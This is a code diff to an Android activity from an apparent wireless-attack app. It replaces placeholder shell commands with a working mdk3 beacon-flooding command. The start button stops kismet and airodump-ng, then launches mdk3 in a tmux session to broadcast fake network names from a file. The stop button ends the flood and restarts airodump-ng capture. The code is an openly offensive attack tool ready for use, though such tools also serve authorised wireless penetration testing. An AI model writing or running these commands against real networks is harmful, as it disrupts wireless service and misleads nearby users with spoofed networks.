@@ -39,20 +39,20 @@ public class AttackToggleOnOffOnly extends AppCompatActivity implements MyCallba
 
         status = findViewById(R.id.statusOfAttack);
 
-        getSupportActionBar().setTitle("Attack 4");
+        getSupportActionBar().setTitle("Beacon flooding");
 
         startAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 Log.d("WALACH","KLIKNIETO");
-                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this, "touch watykanyczk","ATAK CZWARTY","Started").execute();
+                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this, "killall kismet; killall airodump-ng; tmux new-session -d -s beaconFlood ‘mdk3 wlan1 b -a -s 100 -h -f /root/Desktop/fakeESSID.txt'","Beacon flooding attack launched","Started").execute();
             }
         });
 
         endAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this,"rm watykanczyk","ATAK CZWARTY OFF","Ended").execute();
+                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this,"killall mdk3; tmux kill-session -t beaconFlood; airmon-ng start wlan1; airodump-ng wlan1 --output-format netxml -w /tmp/recent > /dev/null 2>&1","Beacon flooding attack terminated","Ended").execute();
             }
         });
 
